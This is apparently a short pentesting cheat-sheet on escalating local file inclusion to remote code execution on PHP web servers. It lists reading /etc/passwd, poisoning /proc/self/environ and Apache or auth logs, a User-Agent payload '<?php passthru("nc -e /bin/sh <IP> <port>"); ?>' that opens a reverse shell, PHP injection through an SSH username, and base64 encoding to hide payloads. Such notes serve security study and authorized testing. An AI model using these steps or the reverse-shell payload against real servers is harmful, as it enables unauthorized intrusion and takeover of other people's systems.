* Some sites make it possible to navigate on the servers file system. Check if you can access local files.
  * /etc/passwd
  * ...
* Try to inject code into readable files like:
  * Environment variables - /proc/self/environ
  * /var/log/auth.log
  * /var/log/apache2/access.log
  * ...
* Use Burp to change header info with PHP code thats going to be executed when reading the local file
  * Change User-Agent (which is an environment variable) to:
    ```php 
    <?php passthru("nc -e /bin/sh <IP> <port>"); ?>
  * Forward request
  * Access local file to execute the php code
* To use /var/log/auth.log just try to ssh to that site
  * **ssh _"phpCode"_@_site_**
* When passing code, its good practice to encode it with a base64 function and call a function to decode afterwards
  * Use Burp Decoder to encode it
  * Call php decode function: **base64_decode(_"encodedCode"_)**
  * Access local file to execute the php code
